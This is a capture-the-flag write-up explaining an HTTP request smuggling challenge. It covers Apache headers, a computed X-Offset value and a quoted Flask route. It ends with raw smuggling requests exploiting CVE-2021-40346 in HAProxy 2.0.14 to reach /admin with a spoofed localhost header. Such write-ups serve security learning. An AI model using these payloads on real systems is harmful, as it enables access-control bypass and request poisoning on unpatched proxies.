# Double Trouble

The challenge provides:
- `httpd.conf`: Apache configuration details.
- `app.py`: The backend Flask application logic.

- The challenge mocks a multi-layer architecture:
`Client -> HAProxy -> Apache -> Flask (Gunicorn)`

- By examining `httpd.conf`, we see that Apache injects specific headers:


```
RequestHeader set X-Apache-Layer "reverse-proxy"
RequestHeader set X-Backend-Route "layer3"
RequestHeader set X-Offset
```

Crucially, it sets `X-Offset` but assigns it no value.


- The `/api/v1/debug` endpoint conveniently reflects all headers received by the backend.

- Querying `/api/v1/debug` reveals:
 `X-Haproxy-Version`: `2.0.14`
 `X-Proxy-Instance`: `frontend-01`
 `X-Apache-Layer`: `reverse-proxy` (from conf)
 `X-Backend-Route`: `layer3` (from conf)



*   **The "Offset" Problem:** Desync attacks occur when one server thinks a message ends at byte $N$, while the other thinks it ends at byte $M$. The remaining bytes become the start (offset) of the next request on the connection.
*   **X-Offset as Simulation:** The `X-Offset` header in this challenge theoretically simulates the internal pointer state corruption that happens during these exploits  You need to calculate the exact byte alignment required to "smuggle" the request past the proxy chain.


- The application calculates validation bytes by summing the full string length of the header line:

1.  `X-Haproxy-Version: 2.0.14\r\n` (Length: 27)
2.  `X-Proxy-Instance: frontend-01\r\n` (Length: 31)
3.  `X-Apache-Layer: reverse-proxy\r\n` (Length: 31)
4.  `X-Backend-Route: layer3\r\n` (Length: 25)

**Total X-Offset:** `27 + 31 + 31 + 25 = 114`.
There is +-5 so anything in the 110-120 range should work. Alternatively you could bruteforce the value of X-Offset if you have figured out rest of the steps and know that X-Offset wasnt provided.

- From `app.py`  `/con` endpoint is used to mark a session as "poisoned".
```py
@app.route('/con')
def reserved_names():
    user_id = get_user_id()
    token = create_session_token(user_id)

    content_length = request.headers.get('Content-Length')
    if content_length:
        try:
            if int(content_length) > 0:
                with session_lock:
                    player_sessions[user_id][token]['poisoned'] = True
        except:
            pass

    response = Response("Reserved", status=200, headers={'Connection': 'keep-alive'})

    return response
```

So we just need to send anything with CL>0 to get the session  id

- The `/debug` and the `.conf` file also reveal the HAprxoy version `2.0.14` which is vulnerable to CVE-2021-40346 ( Integer overflow )

- Exploit:


```
GET /con HTTP/1.1
Host: 20.235.169.197
Content-Length: 47
Connection: keep-alive

GET / HTTP/1.1
Host: 20.235.169.197

```
```
POST /api/v1/data HTTP/1.1
Host: 20.235.169.197
Cookie: session_token=PLACEHOLDER; user_id=PLACEHOLDER
Content-Lengthaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 114
Connection: keep-alive

GET /admin HTTP/1.1
Host: 20.235.169.197
X-Forwarded-For: 127.0.0.1
X-Offset: 114
Cookie: session_token=PLACEHOLDER; user_id=PLACEHOLDER
```


Alternatively you can use [solve.py](solve.py)

